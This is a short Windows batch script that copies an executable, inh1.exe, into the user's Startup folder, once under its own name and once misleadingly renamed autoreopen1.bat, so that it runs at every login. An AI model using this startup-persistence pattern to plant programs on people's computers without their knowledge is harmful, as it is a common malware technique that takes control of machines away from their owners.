@echo off
set "src=%~dp0inh1.exe"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%src%" "%startup%\inh1.exe" /Y
copy "%src%" "%startup%\autoreopen1.bat" /Y


if %ERRORLEVEL%==0 (
    echo File copied successfully to Startup.
) else (
    echo Copy failed. Check permissions.
)
